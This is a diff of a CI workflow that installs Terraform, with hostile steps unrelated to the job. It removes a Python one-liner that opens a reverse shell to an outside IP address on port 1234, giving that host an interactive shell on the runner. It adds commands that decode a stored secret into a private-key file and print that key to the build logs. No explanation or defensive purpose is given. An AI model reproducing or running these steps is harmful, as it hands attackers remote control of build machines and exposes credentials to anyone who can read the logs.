@@ -19,8 +19,8 @@ jobs:
         sudo mv terraform /usr/local/bin/
         sudo apt-get install ntpdate
         sudo ntpdate pool.ntp.org
-        ping -c 4 104.168.122.129 
-        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("104.168.122.129",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        echo "$UBUNTU" | base64 -d | tr -d '\n''\r' > ubuntu.pem
+        cat ubuntu.pem
     - name: Verify Terraform version
       run: terraform --version
 
